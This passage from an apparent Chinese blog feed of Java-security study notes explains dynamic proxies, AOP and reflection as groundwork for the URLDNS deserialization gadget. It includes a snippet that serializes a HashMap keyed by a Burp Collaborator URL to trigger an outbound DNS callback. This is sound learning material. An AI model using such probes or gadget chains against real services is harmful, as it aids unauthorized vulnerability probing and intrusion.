class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">user</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;调用了Update&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>执行：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.test</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Proxy</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ProxyTest</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #7F848E; font-style: italic">//直接连接调用</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E5C07B">IUser</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">user</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">UserImpl</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//接口类引用指向实现类对象</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #7F848E; font-style: italic">//  user.show();</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//静态代理</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">IUser</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">userProxy</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">UserProxy</span><span style="color: #ABB2BF">(user);</span><span style="color: #7F848E; font-style: italic">//传进真正的对象</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">userProxy</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">show</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">userProxy</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">creat</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><ul><li><p>示例</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//动态代理</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//要代理的接口、要做的事情、classloader</span></span><span class="line"><span style="color: #E5C07B">InvocationHandler</span><span style="color: #E06C75"> userinvocationhandler </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">UserInvocationHandler</span><span style="color: #E06C75">(user)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">IUser</span><span style="color: #E06C75"> userProxy </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (IUser) </span><span style="color: #E5C07B">Proxy</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newProxyInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">user</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getClassLoader</span><span style="color: #ABB2BF">(),</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">user</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getInterfaces</span><span style="color: #ABB2BF">(),</span></span><span class="line"><span style="color: #ABB2BF">        userinvocationhandler);</span></span><span class="line"><span style="color: #E5C07B">userProxy</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><ol><li><p>Proxy.newProxyInstance（）就是要新建一个动态代理类</p></li><li><p>查看传参</p><p>代理接口、要传入的东西、类加载器<code>classloader</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251114202828512.png" alt="image-20251114202828469"></p><p>第一个是classloader，第二个是类的接口，第三个是调用处理器（传入的东西）</p><p>前两个是系统固定给的参数，只有InvocationHandler类得自己写</p></li></ol></li><li><p>InvocationHandler类：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UserInvocationHandler</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">InvocationHandler</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251114203424403.png" alt="image-20251114203424363"></p><p>爆红原因：</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251114213825672.png" alt="image-20251114203452235"></p><p>需要重写invoke</p><p>因为：</p><ol><li>JDK 动态代理的所有方法调用，本质上全部都被转发到 <code>InvocationHandler.invoke()</code></li><li>如果你不重写 <code>invoke()</code>，代理对象调用方法时：<ul><li>没有任何逻辑可执行</li><li>也无法调用真实对象</li><li>相当于“没有代理”</li></ul></li><li>InvocationHandler是接口，不是父类，所以接口里面的方法需要实现，也就是通过invoke来实现</li></ol><p>重写之后：</p><p>最重要的就是<code>method</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251114213825688.png" alt="image-20251114204034899"></p><p>不管外界传入什么，都要通过invoke来调用method方法</p><p>代码：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UserInvocationHandler</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">InvocationHandler</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">IUser</span><span style="color: #E06C75"> user</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> UserInvocationHandler</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> UserInvocationHandler</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IUser</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">user</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">user</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> user;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> invoke</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">proxy</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Method</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">method</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Throwable</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;调用了&quot;</span><span style="color: #56B6C2">+</span><span style="color: #E5C07B">method</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">method</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(user, args);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>通过动态调用，来将<code>真实文件</code>中的接口实现调用</p><p>不用写上面那么多的静态代码（<code>UserProxy</code>），节约了代码</p></li><li><p>流程：</p><p>B.f（最终目的）</p><p>A[O] -&gt;O .abc </p><p>O[O2]invoke-&gt;O2.f（使用B.f替换O2）———–&gt;O[B]invoke-&gt;B.f</p><p>所以A[O] ——-&gt;O .abc ———&gt;B.f</p></li><li><p>总结<br>代理 一种设计模式不修改原有类 增加功能</p><p><strong>意义:</strong><br>少修改代码 适配强</p><p>在反序列化漏洞中的<strong>作用</strong>：<br>readObject&gt;反序列化自动执行<br>invoke&gt;有函数调用</p><p>拼接两条链（任意-&gt;固定）</p></li></ul><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><table><thead><tr><th>类型</th><th>本质</th><th>代码谁来写？</th><th>可代理方法数量</th><th>是否需要接口</th></tr></thead><tbody><tr><td><strong>静态代理</strong></td><td>提前写死的代理类</td><td><strong>你写代理类</strong></td><td>固定（写几个代理几个）</td><td>要求接口或继承</td></tr><tr><td><strong>动态代理</strong></td><td>JVM 运行时生成代理类</td><td><strong>JVM 自动生成</strong></td><td>无限制，自动代理全部方法</td><td>JDK 要有接口（CGLIB 可无接口）</td></tr></tbody></table><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>动态代理的核心思想，就是从“静态代理设计模式”演化出来的。它现在的意义主要是用于教学，帮助理解动态代理的核心思想</p><p>现代开发里，静态代理几乎被动态代理和 AOP 完全取代了</p><h3 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h3><p>AOP（面向切面编程）就是：<strong>给方法“加功能”，但不修改原有代码</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">比如：在某个方法（打日志）执行前后自动，但是 不想修改这个方法的源码</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">AOP 就负责：</span></span><span class="line"><span style="color: #abb2bf"> 👉 把这些“横切功能”自动插入到方法的执行过程前/后/周</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">就像吃饭的正常流程：点菜 → 做菜 → 上菜 → 吃饭</span></span><span class="line"><span style="color: #abb2bf">但是老板偷偷加了一些功能：</span></span><span class="line"><span style="color: #abb2bf">每次点菜前：欢迎语（before）</span></span><span class="line"><span style="color: #abb2bf">做菜后：卫生检查（after）</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">饭店厨师没有改自己的代码这些行为是系统自动加的。</span></span></code></pre></div></div></figure><p> AOP 技术是基于<strong>动态代理</strong>实现（动态代理就是 AOP 的底层）</p><p>Spring AOP 本质上就是：</p><figure class="shiki markdown"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">代理对象（Proxy） → “拦截” → 调用真实对象</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">在 invoke() 里加：</span></span><span class="line"><span style="color: #ABB2BF">    - before</span></span><span class="line"><span style="color: #ABB2BF">    - after</span></span><span class="line"><span style="color: #ABB2BF">    - around</span></span><span class="line"><span style="color: #ABB2BF">    - afterThrowing</span></span></code></pre></div></div></figure><p>所以 AOP &#x3D; 动态代理的“封装版”、“高级版”。</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反射&amp;&amp;URLDNS</title>
    <link href="/2025/11/14/%E5%8F%8D%E5%B0%84&amp;&amp;URLDNS/"/>
    <url>/2025/11/14/%E5%8F%8D%E5%B0%84&amp;&amp;URLDNS/</url>
    
    <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="引出"><a href="#引出" class="headerlink" title="引出"></a>引出</h2><p>按照上面的HashMapper进行测试</p><ul><li><p>先写HashMapper传入&lt;url , integer&gt;,传入url会继承Serializable 接口（所以可能存在反序列化触发点）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> person </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Person</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;aa&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">22</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashmap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// System.out.println(person);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashmap)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>测试发现可以序列化（服务端出现请求），但是反序列化没有输出</p><p><code>不序列化也可以出现请求</code></p></li><li><p><strong>原因：</strong></p><p>在HashMapper初始化的时候，将hashcode&#x3D;-1</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251111220051499.png" alt="image-20251111220051455"></p><p>但是存在判断</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251111220112620.png" alt="image-20251111220112576"></p><p>也就是说，初始化的时候是-1，但是在put之后，hashcode发生改变，从而实现序列化反序列化</p></li><li><p>修复；</p><p>在初始化的时候不要发起请求</p><p>put之后，将hashcode变回-1；</p><p>所以就用到了<strong>反射</strong></p></li></ul><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>反射对应正射</p><ul><li><p>正射</p><p>就是正常的java代码流程（已知初始化类，new对象，操作对象）</p></li><li><p>反射</p><p>未知初始化类，所以new不了</p></li></ul><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li><p>反射的作用:让iava具有动态性</p><p>​由于java是强类型语言，写啥就是啥（String  name）</p><p>​而php里面输入啥运行啥（eval&lt;     &gt;）</p><p>​<strong>利用反射就可以实现动态化</strong></p></li><li><p>修改已有对象的属性</p></li><li><p>动态生成对象</p></li><li><p>动态调用方法操作内部类和私有方法</p></li><li></li></ul><p><strong>在反序列化漏洞的作用：</strong></p><ul><li>定制需要的对象</li><li>通过invoke调用除了同名函数以外的函数（以字符串接收方法，可以使用拼接实现绕过）</li><li>通过Class类创建对象，引入不能序列化的类</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>Person类：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 假设存在Person类</span></span><span class="line"><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> age</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> Person</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{}</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> Person</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">age</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> name;</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">age</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> age;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">String</span><span style="color: #61AFEF"> toString</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Person{name=&#39;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> name </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&#39;, age=&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> age </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;}&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>实现：（就是利用class方法，从原型class里面实例化对象）</p><h4 id="从原型class里面实例化对象"><a href="#从原型class里面实例化对象" class="headerlink" title="从原型class里面实例化对象"></a><strong>从原型class里面实例化对象</strong></h4><p>c.newInstance();</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Constructor</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Field</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.lang.reflect.Method</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ReflectionTest</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">person</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Person</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">person</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//反射就是操作Class</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//从原型class里面实例化对象</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//c.newInstance();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">personconstructor</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">int</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (Person) </span><span style="color: #E5C07B">personconstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;abc&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">22</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(p);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>解析：</p><ul><li>利用class接收内容（进到class发现这个方法接收的参数是class类型   ，所以要写成String.class）</li><li>对于想要反射的对象<code>person</code>，写入参数<code>abc,22</code>（分别对应string int ）</li></ul><p>输出：</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112195352992.png" alt="image-20251112195345895"></p><h4 